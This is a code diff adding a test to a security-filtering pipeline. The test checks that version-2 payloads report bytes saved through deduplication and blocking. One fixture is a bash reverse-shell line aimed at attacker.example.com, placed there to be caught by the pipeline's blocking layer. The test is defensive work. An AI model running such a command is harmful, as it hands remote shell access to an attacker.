@@ -89,6 +89,29 @@ test("pipeline: emitter que falla no rompe el pipeline (best-effort)", async () 
   assert.ok(ev.seal.hmacSha256); // el pipeline completó pese al emitter roto
 });
 
+test("pipeline: payload v2 incluye tokens_saved (estimación honesta dedup + blocked)", async () => {
+  // 4 docs: 2 idénticos (a, a-clone) + 1 blocked (DJL) + 1 safe.
+  const a = "Análisis benigno de mercado: crecimiento 12% YoY en SaaS B2B. " + "x".repeat(200);
+  const fetcher = async () => [
+    { url: "a", content: a },
+    { url: "a-clone", content: a },                                          // dedup hit
+    { url: "djl-block", content: "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1" },
+    { url: "ok", content: "Documento limpio sin amenazas." },
+  ];
+  const classifier = async (text, lens) => ({ lens, severity: 4, summary: "ok", signals: [] });
+  const ev = await runPipeline("test-tokens", { lens: "security", fetcher, classifier, requestTsa: false });
+
+  assert.equal(ev.payload.schema_version, 2);
+  const ts = ev.payload.tokens_saved;
+  assert.ok(ts, "tokens_saved debe estar presente en payload v2");
+  assert.ok(ts.dedup_bytes >= a.length, `dedup_bytes ${ts.dedup_bytes} debe cubrir al menos un clone (~${a.length}B)`);
+  assert.ok(ts.blocked_bytes >= 30, "blocked_bytes debe contar el doc djl-block");
+  assert.equal(ts.total_bytes, ts.dedup_bytes + ts.blocked_bytes);
+  assert.equal(ts.chars_per_token, 4);
+  assert.ok(ts.estimated_tokens >= 1, "estimated_tokens debe ser > 0 cuando hubo savings");
+  assert.ok(typeof ts.note === "string" && ts.note.includes("Estimated"), "note debe declarar la aproximación");
+});
+
 test("pipeline: DJL layer bloquea vector prompt-level antes de prefilter (Commit B Synthex v4)", async () => {
   // 3 docs: uno benigno, uno DJL-only (jailbreak), uno prefilter-only (SSRF/metadata).
   // Verifica que: (a) DJL atrapa "DJL-MIS-008" reverse-shell; (b) prefilter atrapa SSRF-1
